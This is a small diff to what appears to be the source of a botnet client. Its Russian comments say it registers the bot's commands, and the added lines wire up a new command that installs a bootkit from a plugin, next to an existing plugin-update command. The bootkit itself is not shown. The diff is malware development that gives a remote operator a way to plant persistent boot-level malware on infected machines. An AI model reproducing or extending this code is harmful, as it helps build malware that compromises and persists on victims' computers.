@@ -857,6 +857,9 @@ void RegisterAllCommands(PTaskManager Manager, DWORD Commands)
 
 	// Регистрируем известные команды бота
 
+	// Команда установки Bootkit из плага
+	RegisterCommand(Manager, (PCHAR)Plugin::CommandInstallBk, Plugin::ExecuteInstallBk);
+
 	// Команда обновления плага
 	RegisterCommand(Manager, (PCHAR)Plugin::CommandUpdatePlug, Plugin::ExecuteUpdatePlug);
 
